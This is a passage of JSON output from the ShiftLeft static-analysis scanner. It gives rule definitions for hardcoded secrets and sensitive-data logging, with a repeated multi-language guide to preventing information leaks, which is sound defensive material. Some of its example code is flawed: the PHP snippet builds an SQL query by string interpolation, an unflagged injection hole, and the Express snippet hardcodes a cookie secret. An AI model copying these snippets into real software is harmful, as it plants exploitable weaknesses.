                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Base64%20High%20Entropy%20String/823112a5d8f8e242ef55f44b7f79fca701419d6674be116f308e1066cb15156f",
                            "name": "Base64 High Entropy String",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Base64 High Entropy String"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/355767e3bd64d7c0385cf5f7caa79fd79cbd7e6eb5dd9ca4b1df868564b8891c",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Sensitive data is logged in this flow."
                            },
                            "help": {
